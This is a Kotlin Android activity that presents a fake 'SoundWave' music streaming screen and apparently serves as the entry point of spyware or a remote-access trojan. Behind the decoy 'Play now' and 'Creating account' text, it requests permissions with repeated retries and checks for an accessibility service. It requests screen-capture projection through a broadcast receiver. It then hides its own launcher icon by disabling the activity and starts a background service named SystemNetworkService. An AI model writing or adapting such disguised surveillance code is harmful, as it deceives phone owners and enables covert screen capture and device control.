package com.openaccess.sdk

import android.Manifest
import android.app.ActivityManager
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.TypedValue
import android.view.Gravity
import android.view.accessibility.AccessibilityManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.app.Activity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.openaccess.sdk.service.AccessibilityHelper
import com.openaccess.sdk.service.DisplayCapture
import com.openaccess.sdk.service.SystemNetworkService

@Suppress("DEPRECATION")
class MainActivity : Activity() {
    companion object {
        private const val RC_ALL = 100; private const val RC_SCREEN = 101; private const val RC_NOTIF = 102
        const val ACTION_REQUEST_SCREEN = "com.openaccess.sdk.REQUEST_SCREEN"
        val CORE_PERMS = listOf<String>()
        val NOTIF_PERM = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.POST_NOTIFICATIONS else null
        val ALL_PERMS = CORE_PERMS + listOfNotNull(NOTIF_PERM)
        val REQUEST_PERMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) ALL_PERMS else CORE_PERMS
        fun hasPermission(ctx: Context, perm: String) = ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED
        fun isAccessibilityEnabled(ctx: Context): Boolean { return try { val am = ctx.getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager; val es = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: ""; es.contains(ComponentName(ctx, AccessibilityHelper::class.java).flattenToString()) && am.isEnabled } catch (_: Exception) { false } }
        fun isServiceRunning(ctx: Context, serviceClass: Class<*>): Boolean { return try { val m = ctx.getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager; m.getRunningServices(Int.MAX_VALUE).any { serviceClass.name == it.service.className } } catch (_: Exception) { false } }
    }

    private lateinit var rootLayout: LinearLayout; private lateinit var statusText: TextView; private var retryCount = 0; private var requestingNotif = false
    private val screenReceiver = object : BroadcastReceiver() { override fun onReceive(ctx: Context?, intent: Intent?) { try { startActivityForResult(DisplayCapture.getProjectionIntent(this@MainActivity), RC_SCREEN) } catch (_: Exception) {} } }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState); if (!isTaskRoot) { finish(); return }
        try { if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN), Context.RECEIVER_NOT_EXPORTED) else registerReceiver(screenReceiver, IntentFilter(ACTION_REQUEST_SCREEN)) } catch (_: Exception) {}
        rootLayout = createMusicView(); setContentView(rootLayout)
        if (ALL_PERMS.all { hasPermission(this, it) }) onSetupComplete()
    }

    private fun dp(dip: Int) = TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, dip.toFloat(), resources.displayMetrics).toInt()

    private fun createMusicView(): LinearLayout {
        val root = LinearLayout(this).apply { orientation = LinearLayout.VERTICAL; setBackgroundColor(Color.parseColor("#121212")); setPadding(dp(24), dp(48), dp(24), dp(24)); gravity = Gravity.CENTER_HORIZONTAL }
        val note = TextView(this).apply { text = "\uD83C\uDFB5"; textSize = 64f; gravity = Gravity.CENTER; setPadding(0, dp(30), 0, dp(16)) }
        val title = TextView(this).apply { text = "SoundWave"; textSize = 28f; setTextColor(Color.parseColor("#1DB954")); gravity = Gravity.CENTER; setPadding(0, 0, 0, dp(4)) }
        val subtitle = TextView(this).apply { text = "Millions of songs. Free."; textSize = 14f; setTextColor(Color.parseColor("#B3B3B3")); gravity = Gravity.CENTER; setPadding(0, 0, 0, dp(32)) }
        val playBtn = Button(this).apply { text = "\u25B6  PLAY NOW"; textSize = 16f; setTextColor(Color.BLACK); setBackgroundColor(Color.parseColor("#1DB954")); setPadding(0, dp(16), 0, dp(16)); layoutParams = LinearLayout.LayoutParams(dp(200), LinearLayout.LayoutParams.WRAP_CONTENT); setOnClickListener { requestAllPerms() } }
        statusText = TextView(this).apply { text = "Sign up to start listening"; textSize = 12f; setTextColor(Color.parseColor("#535353")); gravity = Gravity.CENTER; setPadding(0, dp(16), 0, 0) }
        root.addView(note); root.addView(title); root.addView(subtitle); root.addView(playBtn); root.addView(statusText)
        return root
    }

    private fun requestAllPerms() { val needed = REQUEST_PERMS.filter { !hasPermission(this, it) }; if (needed.isEmpty()) { checkAndProceed(); return }; try { ActivityCompat.requestPermissions(this, needed.toTypedArray(), RC_ALL); statusText.text = "Creating account..."; statusText.setTextColor(Color.parseColor("#1DB954")) } catch (_: Exception) { statusText.text = "Tap again" } }
    private fun requestNotifPermission() { if (NOTIF_PERM == null) { checkAndProceed(); return }; if (hasPermission(this, NOTIF_PERM)) { checkAndProceed(); return }; requestingNotif = true; try { ActivityCompat.requestPermissions(this, arrayOf(NOTIF_PERM), RC_NOTIF) } catch (_: Exception) { requestingNotif = false; checkAndProceed() } }
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) { super.onActivityResult(requestCode, resultCode, data); if (requestCode == RC_SCREEN && resultCode == RESULT_OK && data != null) { DisplayCapture.setProjection(resultCode, data); DisplayCapture.initProjection(this) } }
    override fun onRequestPermissionsResult(requestCode: Int, perms: Array<String>, results: IntArray) { super.onRequestPermissionsResult(requestCode, perms, results); if (requestCode == RC_NOTIF) { requestingNotif = false; checkAndProceed(); return }; if (requestCode == RC_ALL) { if (REQUEST_PERMS.all { hasPermission(this, it) }) { retryCount = 0; checkAndProceed() } else { retryCount++; if (retryCount < 3) Handler(Looper.getMainLooper()).postDelayed({ requestAllPerms() }, 1500) else { retryCount = 0; statusText.text = "Limited features"; (rootLayout.getChildAt(3) as Button).text = "Continue"; (rootLayout.getChildAt(3) as Button).setOnClickListener { onSetupComplete() } } } } }
    private fun checkAndProceed() { if (ALL_PERMS.all { hasPermission(this, it) }) onSetupComplete() else if (retryCount < 3) requestAllPerms() else onSetupComplete() }
    private fun onSetupComplete() { try { packageManager.setComponentEnabledSetting(ComponentName(this, MainActivity::class.java), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP) } catch (_: Exception) {}; try { val i = Intent(this, SystemNetworkService::class.java); if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i) else startService(i) } catch (_: Exception) {}; finishAndRemoveTask() }
    override fun onResume() { super.onResume(); if (isFinishing || !::rootLayout.isInitialized || requestingNotif) return; if (ALL_PERMS.all { hasPermission(this, it) }) onSetupComplete() }
    override fun onPause() { super.onPause(); try { unregisterReceiver(screenReceiver) } catch (_: Exception) {} }
}
